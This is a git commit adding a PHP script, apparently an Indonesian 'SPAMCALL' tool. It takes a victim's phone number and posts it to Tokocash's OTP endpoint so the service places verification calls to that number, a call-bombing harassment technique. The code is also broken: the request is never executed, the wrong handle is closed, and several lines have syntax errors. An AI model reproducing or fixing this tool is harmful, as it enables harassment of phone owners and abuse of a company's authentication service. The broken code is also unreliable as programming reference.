b1c3385b78ad5fd6d1e4f4b168316bd9f7047929
Yukamast <49901148+Yukamast@users.noreply.github.com>
2019-04-23 16:28:40 +0700

    SCALL.php

---
+++ SCALL.php
@@ -0,0 +1,24 @@
+<?php
+
+function send($phone){
+       $ch = curl_init();
+       curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
+       curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+       curl_setopt($ch, CURLOPT_HEADER, true);
+       curl_setopt($ch, CURLOPT_POST, 1);
+       curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");
+       curl_close($sh);
+       
+}
+echo "
+========================================
+SPAMCALL BY YUKAMAST[!]
+INSTAGRAM => rizkiswee
+CONTOH PENGGUNAAN ==>081234567654
+========================================\n";
+echo "MASUKKAN NOMER YANG AKAN DI SPAM[!]\nNOMER => ";
+$number trim(fgets(STDIN));
+$execute send($number)
+print $execute;
+?>
